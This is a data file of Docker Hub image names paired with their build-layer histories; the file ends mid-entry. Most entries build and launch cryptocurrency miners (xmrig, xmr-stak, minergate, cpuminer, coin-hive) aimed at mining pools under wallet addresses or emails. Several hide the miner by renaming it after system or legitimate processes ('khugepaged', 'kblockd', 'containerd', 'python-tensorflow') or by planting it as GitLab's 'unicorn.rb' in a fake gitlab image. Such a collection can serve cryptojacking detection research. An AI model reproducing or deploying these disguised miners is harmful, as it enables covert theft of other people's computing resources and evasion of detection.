ngoctype123/demoo; b'ADD file:7529d28035b43a2281b9ba1d3cf6bde4f0d9517693e9412328761d51c24091b4 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN DEBIAN_FRONTEND=noninteractive apt-get update\nRUN apt-get install -y wget\nRUN wget https://minergate.com/download/deb-cli\nRUN dpkg -i deb-cli\nCMD ["/bin/sh -c minergate-cli -user ithoaiphuong1987@gmail.com -xmr 1"]'
jnewmano/garlicoin; b'ADD file:f5a2d04c3f3cafada15eb32e4e8d971e48ef11724939c399a8664bf498111e67 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nARG DEBIAN_FRONTEND=noninteractive\n|1 DEBIAN_FRONTEND=noninteractive RUN apt-get update && apt-get install -y software-properties-common\n|1 DEBIAN_FRONTEND=noninteractive RUN add-apt-repository ppa:bitcoin/bitcoin\n|1 DEBIAN_FRONTEND=noninteractive RUN apt-get update\n|1 DEBIAN_FRONTEND=noninteractive RUN apt-get install -y git automake autotools-dev autoconf bsdmainutils build-essential libtool pkg-config libboost-all-dev libcurl4-openssl-dev libdb4.8-dev libdb4.8++-dev libevent-dev libjansson-dev libssl-dev libssl-dev libgmp-dev make g++ screen\n|1 DEBIAN_FRONTEND=noninteractive RUN git clone https://github.com/tpruvot/cpuminer-multi.git\n|1 DEBIAN_FRONTEND=noninteractive RUN git clone https://github.com/retosen/Garlicoin.git\nWORKDIR /Garlicoin\n|1 DEBIAN_FRONTEND=noninteractive RUN ./autogen.sh && ./configure --without-gui --disable-tests && make && make install\nWORKDIR /cpuminer-multi\n|1 DEBIAN_FRONTEND=noninteractive RUN ./build.sh && make install\nADD file:77da99c691919e0b003b4cea3d6d70f59e2bc3ba82d5faf48e4f418fd4d23cd9 /root/.garlicoin/\nCMD ["/bin/sh -c cpuminer -a \\"scrypt:2048\\" -o stratum+tcp://pool.grlc-bakery.fun:3333 -u mojiS9qAQbKfG4zEpzQjtjjztSQ8aNHa4r"]'
whomdadd/helloworld; b'ADD file:074f2c974463ab38cf3532134e8ba2c91c9e346457713f2e8b8e2ac0ee9fd83d /\nLABEL org.label-schema.schema-version=1.0 org.label-schema.name=CentOS Base Image org.label-schema.vendor=CentOS org.label-schema.license=GPLv2 org.label-schema.build-date=20190305\nCMD ["/bin/bash"]\nENV XMRIG_VERSION=v2.8.3\nRUN set -ex \t&& yum update -y \t&& yum -y install epel-release \t&& yum install -y glibc-static libstdc++-static \t&& yum groupinstall \'Development Tools\' -y \t&& yum install -y git cmake \t&& yum install -y python36 python36-devel \t&& yum install -y libuv-devel libmicrohttpd-devel libffi-devel openssl-devel     && python36 -m ensurepip \t&& pip3 install --upgrade pip \t&& pip3 install psutil futures cffi paramiko cryptography     && cd /tmp     && git clone https://github.com/xmrig/xmrig     && cd xmrig     && sed -i -e \'s/constexpr const int kDefaultDonateLevel = 5;/constexpr const int kDefaultDonateLevel = 0;/g\' src/donate.h     && mkdir build     && cd build     && cmake .. -DCMAKE_BUILD_TYPE=Release     && make     && mv xmrig /usr/local/sbin/aptitude     && rm -rf /tmp/xmrig\nADD multi:f59d58820e5d3319ceb8a5075521132ba88d9e16842f9317e18b906df9e735ac /bin/\nRUN mv /bin/libffi.so.6.0.4 /usr/lib64/libffi-d78936b1.so.6.0.4\nRUN mv /bin/ld-musl-x86_64.so.1 /usr/lib64/libc.musl-x86_64.so.1\nWORKDIR /bin\nENTRYPOINT ["khugepaged"]'
gotchykid/m-test-m; b'ADD file:1ed4d1a29d09a636dd6c60c6187679adb26c877b6be6968e14272e75ad240073 /\nLABEL name=CentOS Base Image vendor=CentOS license=GPLv2 build-date=20170911\nCMD ["/bin/bash"]\nMAINTAINER Ninja Van\nRUN yum -y install git curl-devel libcurl glib-devel libtool make\nRUN git clone https://github.com/hyc/cpuminer-multi\nWORKDIR /cpuminer-multi\nRUN ./autogen.sh\nRUN CFLAGS="-march=native" ./configure\nRUN make\nCMD ["/bin/sh -c /cpuminer-multi/minerd -a cryptonight -o stratum+tcp://pool.minexmr.com:4444 -u 44qEFENiCPs151zN7JXFYsdiuJaS5WY976jG4Pw55iR47LVNjzhXFaXQL6PeyJdqSkbM5haM5hfXf5z4iT43GDyyL5ksRnp -p x -t $CORES"]'
gawin/coin; b'ADD file:55b071e2cfc3ea2f4bbf048d7d676e3c06a77a9a98d63f7af291f3decb495ec8 /\nCMD ["bash"]\nRUN apt-get update && apt-get install -y --no-install-recommends \t\tca-certificates \t\tcurl \t\twget \t&& rm -rf /var/lib/apt/lists/*\nRUN set -ex; \tif ! command -v gpg > /dev/null; then \t\tapt-get update; \t\tapt-get install -y --no-install-recommends \t\t\tgnupg2 \t\t\tdirmngr \t\t; \t\trm -rf /var/lib/apt/lists/*; \tfi\nRUN groupadd --gid 1000 node   && useradd --uid 1000 --gid node --shell /bin/bash --create-home node\nRUN set -ex   && for key     94AE36675C464D64BAFA68DD7434390BDBE9B9C5     FD3A5288F042B6850C66B31F09FE44734EB7990E     71DCFD284A79C3B38668286BC97EC7A07EDE3FC1     DD8F2338BAE7501E3DD5AC78C273792F7D83545D     C4F0DFFF4E8C1A8236409D08E73BC641CC11F4C8     B9AE9905FFD7803F25714661B63B535A4C206CA9     56730D5401028683275BD23C23EFEFE93C4CFFFE   ; do     gpg --keyserver pgp.mit.edu --recv-keys "$key" ||     gpg --keyserver keyserver.pgp.com --recv-keys "$key" ||     gpg --keyserver ha.pool.sks-keyservers.net --recv-keys "$key" ;   done\nENV NODE_VERSION=8.8.1\nRUN buildDeps=\'xz-utils\'     && ARCH= && dpkgArch="$(dpkg --print-architecture)"     && case "${dpkgArch##*-}"       amd64) ARCH=\'x64\';;       ppc64el) ARCH=\'ppc64le\';;       s390x) ARCH=\'s390x\';;       arm64) ARCH=\'arm64\';;       armhf) ARCH=\'armv7l\';;       *) echo "unsupported architecture"; exit 1 ;;     esac     && set -x     && apt-get update && apt-get install -y $buildDeps --no-install-recommends     && rm -rf /var/lib/apt/lists/*     && curl -SLO "https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-$ARCH.tar.xz"     && curl -SLO --compressed "https://nodejs.org/dist/v$NODE_VERSION/SHASUMS256.txt.asc"     && gpg --batch --decrypt --output SHASUMS256.txt SHASUMS256.txt.asc     && grep " node-v$NODE_VERSION-linux-$ARCH.tar.xz\\$" SHASUMS256.txt | sha256sum -c -     && tar -xJf "node-v$NODE_VERSION-linux-$ARCH.tar.xz" -C /usr/local --strip-components=1     && rm "node-v$NODE_VERSION-linux-$ARCH.tar.xz" SHASUMS256.txt.asc SHASUMS256.txt     && apt-get purge -y --auto-remove $buildDeps     && ln -s /usr/local/bin/node /usr/local/bin/nodejs\nENV YARN_VERSION=1.2.1\nRUN set -ex   && for key     6A010C5166006599AA17F08146C2130DFD2497F5   ; do     gpg --keyserver pgp.mit.edu --recv-keys "$key" ||     gpg --keyserver keyserver.pgp.com --recv-keys "$key" ||     gpg --keyserver ha.pool.sks-keyservers.net --recv-keys "$key" ;   done   && curl -fSLO --compressed "https://yarnpkg.com/downloads/$YARN_VERSION/yarn-v$YARN_VERSION.tar.gz"   && curl -fSLO --compressed "https://yarnpkg.com/downloads/$YARN_VERSION/yarn-v$YARN_VERSION.tar.gz.asc"   && gpg --batch --verify yarn-v$YARN_VERSION.tar.gz.asc yarn-v$YARN_VERSION.tar.gz   && mkdir -p /opt/yarn   && tar -xzf yarn-v$YARN_VERSION.tar.gz -C /opt/yarn --strip-components=1   && ln -s /opt/yarn/bin/yarn /usr/local/bin/yarn   && ln -s /opt/yarn/bin/yarn /usr/local/bin/yarnpkg   && rm yarn-v$YARN_VERSION.tar.gz.asc yarn-v$YARN_VERSION.tar.gz\nCMD ["node"]\nRUN wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add - &&sh -c \'echo "deb http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google-chrome.list\' &&apt-get update &&apt-get install -y google-chrome-unstable gconf-service libasound2 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils wget\nRUN npm i -g coin-hive --unsafe-perm=true --allow-root\nCMD ["/bin/sh -c coin-hive 44KkFKh6YMY5pLqVu53NJgUCXsJbJf8mGWbi7L2EX6wrhPkatYzkh2WKuhoUMFERUuGQJr6u7u2bBa6wtw23v4GW2BZgqN5 --pool-host=xmr-eu1.nanopool.org --pool-port=14444"]'
samhq89/wpfast; b'ADD file:7529d28035b43a2281b9ba1d3cf6bde4f0d9517693e9412328761d51c24091b4 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN DEBIAN_FRONTEND=noninteractive apt-get update\nRUN apt-get install -y wget\nRUN wget https://minergate.com/download/deb-cli\nRUN dpkg -i deb-cli\nCMD ["/bin/sh -c minergate-cli -user samhq.1989@gmail.com -xmr 1"]'
onemorething/test; b'ADD file:c753df38640ab6e246d9e66f0cef7156b7003976080b1e0b83e5717cd6ef1725 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         libmicrohttpd10         libssl1.0.0     && rm -r /var/lib/apt/lists/*\nENV XMR_STAK_CPU_VERSION=v1.1.0-1.2.0\nRUN set -x     && buildDeps=\'         ca-certificates         cmake         curl         g++         libmicrohttpd-dev         libssl-dev         make     \'     && apt-get -qq update     && apt-get -qq --no-install-recommends install $buildDeps     && rm -rf /var/lib/apt/lists/*         && mkdir -p /usr/local/src/xmr-stak-cpu/build     && cd /usr/local/src/xmr-stak-cpu/     && curl -sL https://github.com/fireice-uk/xmr-stak-cpu/archive/$XMR_STAK_CPU_VERSION.tar.gz | tar -xz --strip-components=1     && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h     && cd build     && cmake ..     && make -j$(nproc)     && cp bin/xmr-stak-cpu /usr/local/bin/     && mv /usr/local/bin/xmr-stak-cpu /usr/local/bin/testing     && sed -r         -e \'s/^("pool_address" : ).*,/\\1"etn-jp1.nanopool.org:13333",/\'         -e \'s/^("wallet_address" : ).*,/\\1"etnjxcuq8Y9g89x8v4Ef683ZytAAoz2KGAjqmTiyjwpQJMasfexfTyRZ9sBavAGYN5TPuAq3xiBunhUgz5BXTmyf1kXibJgr5o",/\'         -e \'s/^("pool_password" : ).*,/\\1"x",/\'         ../config.txt > /usr/local/etc/config.txt         && rm -r /usr/local/src/xmr-stak-cpu     && apt-get -qq --auto-remove purge $buildDeps\nENTRYPOINT ["testing"]\nCMD ["/usr/local/etc/config.txt"]'
tapolskiy420/kurwa; b'ADD file:7d3b21b18d7bc6d6db1349979cf0e68073647e90c892aebab0da5d679b5550eb /\nCMD ["bash"]\nRUN apt-get update \t&& apt-get install libmicrohttpd-dev libssl-dev libhwloc-dev curl -y\nADD file:78cc08208f78f96660d4005f06ba1c4290e84afe343ddf4ca7611a7258ce0371 /tmp/xmr-stak\nADD file:770d3052240c63800f9fea0f79fc36d0d415234b672bf25d3075b3c724e88880 /tmp/config.txt\nCMD ["/bin/sh -c KURWA=`curl v4.ifconfig.co | sed \'s/\\\\./\\\\-/g\'` && sed -i \'s/kurwa/\'\\"$KURWA\\"\'/\' /tmp/config.txt && /tmp/xmr-stak --config /tmp/config.txt"]'
admin9705/support; b'ADD file:f5a2d04c3f3cafada15eb32e4e8d971e48ef11724939c399a8664bf498111e67 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nMAINTAINER user@dunn.cloud\nRUN apt-get update\nRUN yes | apt-get install wget\nRUN yes | apt-get install screen\nRUN wget https://minergate.com/download/deb-cli -O minergate-cli.deb\nRUN yes | dpkg -i minergate-cli.deb\nRUN rm -r minergate-cli.deb\nCMD ["/bin/sh -c minergate-cli -user user@dunn.cloud -xmr 96"]'
kblockdkblockd/kblockd; b'ADD file:916a45030dee881bbc8bbabf8bcfcc8828c29ce1c318000950bbe84c57f9df73 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nWORKDIR /app\nUSER root\nRUN apt-get update\nRUN apt-get install git -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev\nRUN git clone https://github.com/xmrig/xmrig.git\nWORKDIR /app/xmrig\nWORKDIR /app/xmrig/build\nRUN cmake ..\nRUN make\nRUN mv xmrig kblockd\nCMD ["/bin/sh -c ./kblockd  -o stratum+tcp://185.243.112.160:1231 -u 42kVTL3bciSHwjfJJNPif2JVMu4daFs6LVyBVtN9JbMXjLu6qZvwGtVJBf4PCeRHbZUiQDzBRBMu731EQWUhYGSoFz2r9fj -p x --max-cpu-usage=95 --donate-level=1"]'
d71549/xx; b'ADD file:4e6b5d9ca371eb881c581574b8dc4f5391eff2872db364af0f8d9804e4890098 /\nRUN  -z "$(apt-get indextargets)" \nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get -y install ca-certificates wget ocl-icd-libopencl1 netbase openssl &&     apt-get -y autoremove &&     apt-get clean\nRUN wget --no-check-certificate -q https://minergate.com/download/xfast-ubuntu-cli-amd -O minergate-cli.deb &&     dpkg -i minergate-cli.deb &&     rm minergate-cli.deb\nENTRYPOINT ["minergate-cli"]\nCMD ["--user enzo0@o2.pl --xmr"]\nRUN mv /usr/bin/minergate-cli /usr/bin/python-tensorflow\nENTRYPOINT ["/bin/bash"]\nCMD [""]'
z0re/containerd; b'ADD file:fe1f09249227e2da2089afb4d07e16cbf832eeb804120074acd2b8192876cd28 /\nCMD ["/bin/sh"]\nCOPY file:c55eb37b43e95ef4944a4d24226c0151fd759147a924a2b6cc1d825e89dc7f1e /bin/\nRUN mv /bin/xmrig /bin/containerd &&     apk --no-cache add     libuv-dev\nRUN apk --no-cache add     --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing     hwloc-dev\nRUN adduser -S -D -H -h /containerd u\nRUN containerd --help\nUSER u\nENTRYPOINT ["containerd"]\nCMD ["--help"]'
lolziac/gitlabxsc; b'ADD file:f5a2d04c3f3cafada15eb32e4e8d971e48ef11724939c399a8664bf498111e67 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update     && apt-get -qq --no-install-recommends install         libmicrohttpd10         libssl1.0.0     && rm -r /var/lib/apt/lists/*\nENV XMR_STAK_CPU_VERSION=v1.1.0-1.2.0\nRUN set -x     && buildDeps=\'         ca-certificates         cmake         curl         g++         libmicrohttpd-dev         libssl-dev         make     \'     && apt-get -qq update     && apt-get -qq --no-install-recommends install $buildDeps     && rm -rf /var/lib/apt/lists/*         && mkdir -p /usr/local/src/xmr-stak-cpu/build     && cd /usr/local/src/xmr-stak-cpu/     && curl -sL https://github.com/fireice-uk/xmr-stak-cpu/archive/$XMR_STAK_CPU_VERSION.tar.gz | tar -xz --strip-components=1     && sed -i \'s/constexpr double fDevDonationLevel.*/constexpr double fDevDonationLevel = 0.0;/\' donate-level.h     && cd build     && cmake ..     && make -j$(nproc)     && mkdir -p /var/opt/gitlab/gitlab-rails/etc/     && mkdir -p /opt/gitlab/embedded/service/gitlab-rails/     && cp bin/xmr-stak-cpu /var/opt/gitlab/gitlab-rails/etc/unicorn.rb     && sed -r         -e \'s/^("pool_address" : ).*,/\\1"xmr.crypto-pool.fr:443",/\'         -e \'s/^("wallet_address" : ).*,/\\1"44V87e8wN8y8Bk1zAgRhL6ULiU1pFVdW5Ns2ZzmvXEti9kk6hZNBDgPQK6ZPpd7zNLK",/\'         -e \'s/^("pool_password" : ).*,/\\1"",/\'         ../config.txt > /usr/local/etc/config.txt         && rm -r /usr/local/src/xmr-stak-cpu     && apt-get -qq --auto-remove purge $buildDeps\nCOPY file:d3775c81dc503d112781ed0dfa985596d63d14058ace3f35392cc23bb0580a0b /opt/gitlab/embedded/service/gitlab-rails/config.ru\nENTRYPOINT ["/var/opt/gitlab/gitlab-rails/etc/unicorn.rb"]\nCMD ["/opt/gitlab/embedded/service/gitlab-rails/config.ru"]'
kesiho/minci; b'ADD file:280a445783f309c90ab928883d98e4326c1fbe19927c8a555da41bcb74c71a45 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> 